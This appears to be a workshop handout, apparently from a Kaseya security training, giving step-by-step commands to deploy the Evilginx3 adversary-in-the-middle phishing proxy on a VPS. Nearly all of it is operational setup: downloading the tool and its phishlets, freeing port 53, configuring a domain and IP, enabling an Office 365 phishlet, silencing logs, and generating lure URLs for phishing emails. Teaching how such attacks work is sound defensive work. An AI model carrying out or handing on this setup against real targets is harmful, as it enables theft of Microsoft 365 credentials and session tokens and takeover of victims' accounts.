# Kaseya AiTM Workshop Reference Guide
Please don't skip ahead!


## Signing into your VPS
```bash
# Syntax ssh <username>@<external IP of your server>
ssh root@192.192.129.192

# Confirming you have root access
whoami
```

## Downloading the Software and Cloning GitHub Repositories
```bash
# Download Evilginx 3
wget https://github.com/bjones-saasalerts/evilginx3/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip

# Cloning the Evilginx 3 Phishlets
git clone https://github.com/bjones-saasalerts/phishlets
```

## Extracting Evilginx and Making it Executable
```bash
# Install unzip
apt install zip -y

# Extract the zip file
unzip evilginx-v3.3.0-linux-64bit.zip

# Make evilginx executable
chmod +x evilginx

```

## Time to run Evilginx3!

```bash
# Disable the Ubuntu resolver (it is sitting on port 53 and we need that port)
systemctl stop systemd-resolved

# Running Evilginx3 for the first time!
./evilginx -p /root/phishlets/
```

## Ready to become a hacker?

```bash
# Time to configure your software
config domain <your domain>

config ipv4 external <your public ip>

# Now let's setup our phishlets

phishlets hostname o365 <your domain>

phishlets enable o365

# This will turn off that log so you're not constantly seeing random IPs hit your server!

blacklist log off   # This will shut off logs

# Time to create our Lures (basically, these are the URLs we'll include in our phishing emails

lures create o365

lures get-url 0
```

## Now that you have setup your server you're ready to go!!
